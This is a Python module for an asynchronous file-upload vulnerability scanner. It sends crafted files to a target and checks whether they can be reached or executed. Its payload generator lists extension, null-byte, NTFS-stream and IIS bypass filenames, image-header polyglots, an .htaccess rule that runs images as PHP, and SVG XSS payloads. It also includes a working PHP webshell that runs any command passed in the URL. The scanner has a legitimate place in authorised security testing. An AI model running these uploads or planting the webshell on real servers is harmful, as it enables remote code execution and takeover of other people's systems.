#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
异步扫描器 - 整合upload_forge功能
"""

import asyncio
import random
from urllib.parse import quote, urljoin
from typing import List, Optional, Callable
from datetime import datetime

from .async_http_client import AsyncHTTPClient
from .async_response_analyzer import AsyncResponseAnalyzer
from .models import (
    ScanResult, VulnerabilityFinding, TrafficLog,
    RISK_CRITICAL, RISK_HIGH, RISK_MEDIUM, RISK_LOW,
    CONFIDENCE_CERTAIN, CONFIDENCE_HIGH, CONFIDENCE_MEDIUM
)


class AsyncScanner:
    """异步文件上传漏洞扫描器"""
    
    def __init__(self):
        self.analyzer = AsyncResponseAnalyzer()
        self.results = []
        self.running = False
        self.max_payloads = 200  # 【新增】默认Payload数量限制
    
    async def scan(self, 
                   target_url: str, 
                   file_param: str = "file",
                   upload_dir: Optional[str] = None,
                   proxies: Optional[dict] = None,
                   headers: Optional[dict] = None,
                   cookies: Optional[str] = None,
                   on_log_callback: Optional[Callable[[str], None]] = None,
                   on_traffic_callback: Optional[Callable[[TrafficLog], None]] = None,
                   on_finding_callback: Optional[Callable[[VulnerabilityFinding], None]] = None,
                   on_result_callback: Optional[Callable[[dict], None]] = None,
                   max_payloads: int = 200,  # 【新增】Payload数量限制
                   progress_callback: Optional[Callable[[str, int], None]] = None) -> ScanResult:
        """执行扫描"""
        self.running = True
        start_time = datetime.now()
        
        # 解析cookies
        cookie_dict = {}
        if cookies:
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    k, v = cookie.strip().split('=', 1)
                    cookie_dict[k] = v
        
        # 创建HTTP客户端
        engine = AsyncHTTPClient(proxies=proxies, headers=headers, cookies=cookie_dict)
        engine.set_log_callback(on_traffic_callback)
        
        scan_result = ScanResult(target=target_url, start_time=start_time)
        
        if on_log_callback:
            on_log_callback(f"开始扫描: {target_url}")
        
        # 生成payloads - 【修复】使用max_payloads限制
        payloads = self._generate_payloads(max_payloads)
        total = len(payloads)
        
        for i, payload in enumerate(payloads):
            if not self.running:
                break
            
            if progress_callback:
                progress_callback(f"测试 {payload.get('desc', 'unknown')} ({i+1}/{total})", int((i+1)/total*100))
            
            if on_log_callback:
                on_log_callback(f"测试 {payload.get('desc', 'unknown')}")
            
            try:
                result = await self._test_payload(
                    engine, target_url, file_param, payload, upload_dir
                )
                
                # 发送结果到回调（用于实时显示）
                if result and on_result_callback:
                    on_result_callback(result)
                
                # 如果是漏洞发现
                if result and result.get('is_vulnerability'):
                    finding = result.get('finding')
                    if finding:
                        scan_result.findings.append(finding)
                        scan_result.stats["vulns_found"] += 1
                        if on_finding_callback:
                            on_finding_callback(finding)
                        if on_log_callback:
                            on_log_callback(f"[+] 发现漏洞: {finding.name}")
                
                scan_result.stats["total_requests"] += 1
                
            except Exception as e:
                if on_log_callback:
                    on_log_callback(f"[-] 测试失败: {str(e)}")
        
        await engine.close()
        scan_result.end_time = datetime.now()
        self.running = False
        
        if on_log_callback:
            on_log_callback("扫描完成")
        
        return scan_result
    
    async def _test_payload(self, 
                           engine: AsyncHTTPClient, 
                           target_url: str, 
                           file_param: str, 
                           payload: dict,
                           upload_dir: Optional[str] = None) -> Optional[dict]:
        """测试单个payload - 返回详细结果"""
        content = payload['content']
        content_type = "application/octet-stream"
        
        # 处理文件名
        if payload.get('filename'):
            actual_filename = payload['filename']
        else:
            rand_suffix = str(random.randint(1000, 9999))
            actual_filename = f"test_{rand_suffix}.{payload['ext']}"
        
        # 上传文件
        try:
            response = await engine.upload_file(
                url=target_url,
                file_field_name=file_param,
                filename=actual_filename,
                file_content=content,
                content_type=content_type
            )
        except Exception as e:
            return None
        
        # 分析上传响应
        analysis = self.analyzer.analyze_upload_response(response, actual_filename)
        
        # 关键修复: 对 3xx 上传响应跟进一次重定向页面，再做二次判定
        redirect_location = response.headers.get("location", "")
        followed_redirect = False
        if 300 <= response.status_code < 400 and redirect_location:
            try:
                redirect_url = urljoin(str(response.request.url), redirect_location)
                redirect_resp = await engine.get(redirect_url)
                redirect_analysis = self.analyzer.analyze_upload_response(redirect_resp, actual_filename)
                followed_redirect = True
                
                # 合并判定：若重定向目标页更“成功”，采用其结果
                better_success = redirect_analysis.get("is_success", False) and not analysis.get("is_success", False)
                better_score = redirect_analysis.get("success_probability", 0) > analysis.get("success_probability", 0)
                if better_success or better_score:
                    merged_reasons = list(analysis.get("decision_reasons", []))
                    merged_reasons.append(f"跟进重定向: {redirect_location}")
                    merged_reasons.extend(redirect_analysis.get("decision_reasons", []))
                    redirect_analysis["decision_reasons"] = merged_reasons[:10]
                    analysis = redirect_analysis
                    # 用重定向目标页补充路径信息
                    if not analysis.get("path_leaked"):
                        analysis["path_leaked"] = redirect_location
            except Exception:
                # 跟进失败不影响原始判定
                pass
        
        # 格式化请求头和响应头
        req_headers = "\n".join([f"{k}: {v}" for k, v in response.request.headers.items()])
        res_headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
        
        # 构建结果字典
        result = {
            'filename': actual_filename,
            'payload_type': payload.get('type', 'unknown'),
            'description': payload.get('desc', ''),
            'status_code': response.status_code,
            'is_success': analysis['is_success'],
            'is_redirect': analysis.get('is_redirect', False),
            'success_probability': analysis['success_probability'],
            'path_leaked': analysis.get('path_leaked'),
            'response_length': analysis['length'],
            'confidence_level': analysis.get('confidence_level', 'low'),
            'decision_reasons': analysis.get('decision_reasons', []),
            'server_filename': analysis.get('server_filename'),
            'followed_redirect': followed_redirect,
            'is_vulnerability': False,
            'finding': None,
            'request_headers': req_headers,
            'response_headers': res_headers,
            'response_body': response.text  # 完整响应内容
        }
        if followed_redirect:
            extra = f"重定向跟进: {redirect_location}"
            result['decision_reasons'] = (result.get('decision_reasons', []) + [extra])[:10]
        
        # 验证文件存在性
        verified_execution = False
        verified_upload = False
        verification_url = None
        
        should_verify = analysis['is_success'] or analysis['success_probability'] >= 55
        if upload_dir and should_verify:
            base = upload_dir.rstrip("/")
            candidates = analysis.get('verify_filenames') or [actual_filename]
            for check_filename in candidates:
                if not check_filename:
                    continue
                verification_url = f"{base}/{quote(check_filename, safe='/%._-')}"
                try:
                    check_resp = await engine.check_file_existence(verification_url)
                    if check_resp.status_code != 200:
                        continue
                    
                    verified_upload = True
                    result['verified_upload'] = True
                    result['path_leaked'] = result.get('path_leaked') or verification_url
                    result['verification_url'] = verification_url
                    
                    # 检查代码执行
                    if b"UploadForge_Test_Success_" in content:
                        if self.analyzer.analyze_execution_response(check_resp, "46"):
                            verified_execution = True
                            result['verified_execution'] = True
                    
                    # 内容匹配确认
                    if check_resp.content == content:
                        verified_upload = True
                    
                    # 命中一个可访问候选即停止
                    break
                except Exception:
                    continue
        
        # 构造发现结果
        if verified_execution:
            result['is_vulnerability'] = True
            result['finding'] = self.analyzer.create_finding(
                name=f"远程代码执行 ({payload.get('type', 'unknown')})",
                description=f"成功上传并执行 {payload.get('type', 'unknown')} 文件",
                risk_level=RISK_CRITICAL,
                confidence=CONFIDENCE_CERTAIN,
                url=target_url,
                payload=actual_filename,
                proof=f"文件可在 {verification_url} 访问并执行代码",
                remediation="验证文件扩展名白名单，禁用上传目录的执行权限",
                request_data=req_headers,
                response_data=response.text
            )
        elif verified_upload:
            result['is_vulnerability'] = True
            result['finding'] = self.analyzer.create_finding(
                name=f"任意文件上传 ({payload.get('type', 'unknown')})",
                description=f"成功上传 {payload.get('type', 'unknown')} 文件，服务器未阻止此扩展名",
                risk_level=RISK_HIGH,
                confidence=CONFIDENCE_CERTAIN,
                url=target_url,
                payload=actual_filename,
                proof=f"文件可在 {verification_url} 访问",
                remediation="验证文件扩展名白名单",
                request_data=req_headers,
                response_data=response.text
            )
        # 高概率但未验证 - 302重定向也算作潜在成功
        elif analysis['is_success'] and analysis['success_probability'] >= 30:
            result['is_vulnerability'] = True
            
            # 根据概率判断风险等级
            if analysis['success_probability'] >= 70:
                risk = RISK_HIGH
                confidence = CONFIDENCE_HIGH
            else:
                risk = RISK_MEDIUM
                confidence = CONFIDENCE_MEDIUM
            
            # 构建证明信息
            if analysis.get('is_redirect'):
                proof = f"服务器返回 {response.status_code} 重定向，通常表示上传成功"
                location = response.headers.get('location', '')
                if location:
                    proof += f"，重定向到: {location}"
            else:
                proof = f"服务器响应 {response.status_code}"
            
            result['finding'] = self.analyzer.create_finding(
                name=f"潜在文件上传 ({payload.get('type', 'unknown')})",
                description=f"上传请求可能成功 (概率: {analysis['success_probability']}%)",
                risk_level=risk,
                confidence=confidence,
                url=target_url,
                payload=actual_filename,
                proof=proof,
                remediation="确保文件不存储在Web根目录",
                request_data=req_headers,
                response_data=response.text
            )
        
        return result
    
    def _generate_payloads(self, max_limit: int = 200) -> List[dict]:
        """【修复】生成测试payloads，支持自定义数量限制"""
        payloads = []
        
        # 使用传入的限制，或默认值
        max_payloads = max_limit if max_limit else 200
        
        # 1. 标准WebShell
        php_content = b"<?php echo 'UploadForge_Test_Success_' . (23 * 2); ?>"
        jsp_content = b"<% out.println(\"UploadForge_Test_Success_\" + (23 * 2)); %>"
        aspx_content = b'<%@ Page Language="C#" %> <% Response.Write("UploadForge_Test_Success_" + (23 * 2)); %>'
        
        payloads.append({"type": "php_shell", "ext": "php", "content": php_content, "desc": "标准PHP Shell"})
        payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
        payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})
        
        # 2. PHP变体 - 【新增】更多变体
        php_variants = ["pHp", "PHP", "php5", "phtml", "php7", "phar", "phps", "php4", "php3", "pht"]
        for ext in php_variants:
            payloads.append({
                "type": f"php_variant_{ext}",
                "ext": ext,
                "content": php_content,
                "desc": f"PHP变体 .{ext}"
            })
        
        # 3. 双扩展名 - 【新增】更多组合
        base_name = "shell"
        double_exts = [
            ("php", "jpg"), ("php", "png"), ("php", "gif"), ("php", "bmp"),
            ("php", "txt"), ("php", "pdf"), ("php", "doc"), ("php", "zip"),
            ("jsp", "jpg"), ("jsp", "png"), ("jsp", "gif"),
            ("asp", "txt"), ("aspx", "jpg"), ("aspx", "png"),
            ("jpg", "php"), ("png", "php"), ("gif", "php"), ("txt", "php")
        ]
        
        for malicious, safe in double_exts:
            payloads.append({
                "type": f"double_ext_{malicious}_{safe}",
                "ext": f"{malicious}.{safe}",
                "filename": f"{base_name}.{malicious}.{safe}",
                "content": php_content if malicious == "php" else (jsp_content if malicious == "jsp" else aspx_content),
                "desc": f"双扩展名 .{malicious}.{safe}"
            })
        
        # 4. 空字节注入 - 【新增】更多变体
        null_byte_variants = [
            ("shell.php%00.jpg", "php%00.jpg"),
            ("shell.php%2500.jpg", "php%2500.jpg"),
            ("shell.php\\x00.jpg", "php\\x00.jpg"),
            ("shell.php\\0.jpg", "php\\0.jpg"),
            ("shell.php%2500.png", "php%2500.png"),
            ("shell.php%2500.gif", "php%2500.gif"),
        ]
        for filename, ext in null_byte_variants:
            payloads.append({
                "type": "null_byte_injection",
                "ext": ext,
                "filename": filename,
                "content": php_content,
                "desc": f"空字节注入 {filename}"
            })
        
        # 5. Polyglots / 魔术字节 - 【新增】更多类型
        gif_polyglot = b"GIF89a" + php_content
        payloads.append({
            "type": "polyglot_gif",
            "ext": "php",
            "filename": "logo.gif.php",
            "content": gif_polyglot,
            "desc": "GIF89a Polyglot"
        })
        
        png_magic = b"\x89PNG\r\n\x1a\n"
        png_content = png_magic + php_content
        payloads.append({
            "type": "magic_png",
            "ext": "php",
            "filename": "image.png.php",
            "content": png_content,
            "desc": "PNG魔术字节 + PHP"
        })
        
        jpg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF"
        jpg_content = jpg_magic + php_content
        payloads.append({
            "type": "magic_jpg",
            "ext": "php",
            "filename": "image.jpg.php",
            "content": jpg_content,
            "desc": "JPEG魔术字节 + PHP"
        })
        
        # 6. XSS SVG - 【新增】更多XSS payload
        svg_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'UploadForge\')"></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
            b'<svg/onload=alert(document.domain)>',
            b'<img src=x onerror=alert(1)>',
        ]
        for i, svg in enumerate(svg_payloads):
            payloads.append({
                "type": f"xss_svg_{i}",
                "ext": "svg",
                "content": svg,
                "desc": f"XSS via SVG #{i+1}"
            })
        
        # 7. EICAR测试文件
        eicar_content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        payloads.append({"type": "eicar", "ext": "txt", "content": eicar_content, "desc": "EICAR测试文件"})
        
        # 8. 尾部点号绕过 (Windows)
        payloads.append({
            "type": "trailing_dot",
            "ext": "php.",
            "filename": "shell.php.",
            "content": php_content,
            "desc": "尾部点号绕过 shell.php."
        })
        
        # 9. 备用数据流 (Windows NTFS)
        payloads.append({
            "type": "alternate_data_stream",
            "ext": "php",
            "filename": "shell.php::$DATA",
            "content": php_content,
            "desc": "NTFS备用数据流 shell.php::$DATA"
        })
        
        # 10. 分号绕过 (IIS) - 【新增】更多变体
        payloads.append({
            "type": "semicolon_bypass",
            "ext": "php",
            "filename": "shell.asp;.jpg",
            "content": aspx_content,
            "desc": "分号绕过 (IIS) shell.asp;.jpg"
        })
        payloads.append({
            "type": "semicolon_bypass_jsp",
            "ext": "jsp",
            "filename": "shell.jsp;.jpg",
            "content": jsp_content,
            "desc": "分号绕过 (IIS) shell.jsp;.jpg"
        })
        
        # 11. 【新增】.htaccess 攻击
        htaccess_content = b"AddType application/x-httpd-php .jpg .png .gif\n"
        payloads.append({
            "type": "htaccess_attack",
            "ext": "htaccess",
            "filename": ".htaccess",
            "content": htaccess_content,
            "desc": ".htaccess 文件攻击"
        })
        
        # 12. 【新增】文件包含 payload
        include_payloads = [
            ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
            ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
            ("index.php~", b"<?php system($_GET['cmd']); ?>"),
        ]
        for filename, content in include_payloads:
            payloads.append({
                "type": "file_include",
                "ext": filename.split('.')[-1],
                "filename": filename,
                "content": content,
                "desc": f"文件包含 {filename}"
            })
        
        # 13. 【新增】更多 ASP/ASPX 变体
        asp_variants = ["asp", "asa", "cer", "aspx", "ashx", "asmx", "asax"]
        for ext in asp_variants:
            payloads.append({
                "type": f"asp_variant_{ext}",
                "ext": ext,
                "content": aspx_content,
                "desc": f"ASP变体 .{ext}"
            })
        
        # 【修复】使用传入的max_limit参数限制返回数量
        return payloads[:max_limit]
    
    def stop(self):
        """停止扫描"""
        self.running = False
